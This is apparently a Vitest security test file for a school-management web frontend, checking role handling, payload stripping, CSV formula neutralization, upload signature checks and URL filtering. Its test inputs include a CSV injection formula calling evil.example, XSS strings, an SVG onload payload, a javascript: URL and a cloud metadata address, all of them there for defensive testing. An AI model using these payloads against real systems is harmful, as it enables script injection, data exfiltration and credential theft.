import { readFileSync } from 'node:fs'

import { describe, expect, it } from 'vitest'

import { getExplicitAllowedSections, getNavItemsForProfile, getSessionRoleProfile } from '../App'
import { clampApiPageLimit, pickAllowedPayload, resolveApiAssetUrl, safeApiFilePreviewKind } from '../api'
import type { MePermissionsPayload, SessionPayload, UserAccount } from '../types'
import { buildCsv } from './csv'
import { validateOmrBatchFiles, validateOmrFile, validateProfileImageFile } from './file-security'
import { safeMarkdownImageUrl, uniqueSafePrintableImages } from './markdown-media-security'
import { sanitizePublicErrorMessage } from './safe-errors'

const baseUser: UserAccount = {
  id: 'user-1',
  name: 'Usuario Teste',
  email: 'user@example.com',
  roleId: 'role-unknown',
  schoolId: 'school-a',
  status: 'ativo',
  phone: '',
}

function makeSession(overrides: Partial<SessionPayload> = {}): SessionPayload {
  return {
    currentUser: baseUser,
    currentRole: null,
    alertCount: 0,
    ...overrides,
  }
}

function file(bytes: Array<number> | string, name: string, type: string) {
  return new File([typeof bytes === 'string' ? bytes : new Uint8Array(bytes)], name, { type })
}

describe('security hardening helpers', () => {
  it('never falls back to ADMIN when the session role is absent or unknown', () => {
    expect(getSessionRoleProfile(null)).toBeNull()
    expect(getSessionRoleProfile(makeSession())).toBeNull()
    expect(getNavItemsForProfile(null)).toEqual([])
  })

  it('keeps ADMIN away from global access management and enables linked-school calendar', () => {
    const adminPermissions: MePermissionsPayload = {
      role: null,
      roleCode: 'ADMIN',
      permissions: [],
      allowedSections: ['dashboard', 'access'],
    }
    const superAdminPermissions: MePermissionsPayload = {
      ...adminPermissions,
      roleCode: 'SUPERADMIN',
    }
    const adminCalendarPermissions: MePermissionsPayload = {
      ...adminPermissions,
      allowedSections: ['dashboard', 'calendar', 'access'],
    }

    expect(getExplicitAllowedSections(null, adminPermissions)).toEqual([])
    expect(getExplicitAllowedSections('ADMIN', adminPermissions)).toEqual(['dashboard', 'calendar'])
    expect(getExplicitAllowedSections('ADMIN', adminCalendarPermissions)).toEqual(['dashboard', 'calendar'])
    expect(getExplicitAllowedSections('SUPERADMIN', superAdminPermissions)).toEqual(['dashboard', 'access'])
  })

  it('strips dangerous mass-assignment fields before sending frontend payloads', () => {
    const payload = {
      name: 'Aluno',
      schoolId: 'school-b',
      roleId: 'admin-role',
      permissions: ['*'],
      passwordHash: 'hash',
    }

    expect(pickAllowedPayload(payload, ['name'])).toEqual({ name: 'Aluno' })
  })

  it('clamps large pagination values', () => {
    expect(clampApiPageLimit(999999)).toBe(100)
    expect(clampApiPageLimit(-5)).toBe(25)
  })

  it('hides technical backend details from public error messages', () => {
    expect(sanitizePublicErrorMessage('Error: SELECT * FROM users at C:\\app\\server.js:10', 500)).toBe(
      'Nao foi possivel concluir a operacao agora. Tente novamente em alguns instantes.',
    )
    expect(sanitizePublicErrorMessage('Bearer abc.def.ghi leaked', 400)).toBe('Nao foi possivel conversar com a API.')
    expect(sanitizePublicErrorMessage('Nome obrigatorio.', 400)).toBe('Nome obrigatorio.')
  })

  it('neutralizes CSV formulas', () => {
    const csv = buildCsv([
      ['Campo', 'Valor'],
      ['nome', '=WEBSERVICE("https://evil.example")'],
      ['saldo', '+cmd'],
      ['negativo', '-10+20'],
      ['formula', '@SUM(A1:A2)'],
    ])

    expect(csv).toContain("\"'=WEBSERVICE(\"\"https://evil.example\"\")\"")
    expect(csv).toContain("\"'+cmd\"")
    expect(csv).toContain("\"'-10+20\"")
    expect(csv).toContain("\"'@SUM(A1:A2)\"")
  })

  it('accepts only valid OMR/profile file signatures and bounded batches', async () => {
    const jpg = file([0xff, 0xd8, 0xff, 0xe0, 0x00], 'cartao.jpg', 'image/jpeg')
    const fakeJpg = file('<script>alert(1)</script>', 'cartao.jpg', 'image/jpeg')
    const svg = file('<svg onload="alert(1)"></svg>', 'cartao.svg', 'image/svg+xml')

    await expect(validateOmrFile(jpg)).resolves.toMatchObject({ ok: true })
    await expect(validateProfileImageFile(jpg)).resolves.toMatchObject({ ok: true })
    await expect(validateOmrFile(fakeJpg)).resolves.toMatchObject({ ok: false })
    await expect(validateProfileImageFile(svg)).resolves.toMatchObject({ ok: false })
    await expect(validateOmrFile(file('%PDF-1.7', 'cartao.pdf', 'application/pdf'))).resolves.toMatchObject({ ok: false })
    await expect(validateOmrBatchFiles(Array.from({ length: 21 }, (_, index) => file([0xff, 0xd8, 0xff, 0xe0, 0x00], `lote-${index}.jpg`, 'image/jpeg'))))
      .resolves.toMatchObject({ ok: false })
  })

  it('blocks untrusted markdown images and oversized data URLs', () => {
    const smallDataImage = `data:image/png;base64,${btoa('safe')}`
    const hugeDataImage = `data:image/png;base64,${'A'.repeat(800_000)}`

    expect(safeMarkdownImageUrl('https://tracker.example/pixel.png')).toBeNull()
    expect(safeMarkdownImageUrl('http://169.254.169.254/latest/meta-data')).toBeNull()
    expect(safeMarkdownImageUrl(hugeDataImage)).toBeNull()
    expect(safeMarkdownImageUrl(smallDataImage)).toBe(smallDataImage)
    expect(uniqueSafePrintableImages([{ url: '/assets/q.png', alt: 'Questao' }], { resolveRelativeUrl: (url) => `/api${url}` }))
      .toEqual([{ url: '/api/assets/q.png', alt: 'Questao' }])
  })

  it('restricts API asset URLs to relative, same-origin, allowlisted or small safe data images', () => {
    const smallDataImage = `data:image/png;base64,${btoa('safe')}`
    const hugeDataImage = `data:image/png;base64,${'A'.repeat(800_000)}`

    expect(resolveApiAssetUrl('/api/files/card.png')).toBe('/api/files/card.png')
    expect(resolveApiAssetUrl('avatars/user.png')).toBe('/avatars/user.png')
    expect(resolveApiAssetUrl(smallDataImage)).toBe(smallDataImage)
    expect(resolveApiAssetUrl(hugeDataImage)).toBeUndefined()
    expect(resolveApiAssetUrl('https://tracker.example/pixel.png')).toBeUndefined()
    expect(resolveApiAssetUrl('javascript:alert(1)')).toBeUndefined()
    expect(resolveApiAssetUrl('data:text/html;base64,PHNjcmlwdD4=')).toBeUndefined()
    expect(resolveApiAssetUrl('data:image/svg+xml;base64,PHN2Zy8+')).toBeUndefined()
    expect(resolveApiAssetUrl('blob:https://app.example/123')).toBeUndefined()
  })

  it('previews files only from trusted response content types', () => {
    expect(safeApiFilePreviewKind('application/pdf')).toBe('pdf')
    expect(safeApiFilePreviewKind('application/pdf; charset=utf-8')).toBe('pdf')
    expect(safeApiFilePreviewKind('image/png')).toBe('image')
    expect(safeApiFilePreviewKind('image/webp')).toBe('image')
    expect(safeApiFilePreviewKind('text/html')).toBe('unknown')
    expect(safeApiFilePreviewKind('image/svg+xml')).toBe('unknown')
    expect(safeApiFilePreviewKind('application/octet-stream')).toBe('unknown')
  })

  it('keeps PDF previews sandboxed and CSP scripts strict in deployment config', () => {
    const correctionView = readFileSync(new URL('../views/EvaluationCorrectionsView.tsx', import.meta.url), 'utf8')
    const nginxConfig = readFileSync(new URL('../../nginx.conf', import.meta.url), 'utf8')

    expect(correctionView.match(/<iframe[\s\S]*?sandbox=""/g)?.length ?? 0).toBeGreaterThanOrEqual(1)
    expect(correctionView.match(/<PdfPreview /g)?.length ?? 0).toBeGreaterThanOrEqual(2)
    expect(nginxConfig).toContain("script-src 'self'")
    expect(nginxConfig).not.toContain("script-src 'self' 'unsafe-inline'")
    expect(nginxConfig).toContain("frame-ancestors 'none'")
    expect(nginxConfig).toContain('X-Content-Type-Options "nosniff"')
  })
})
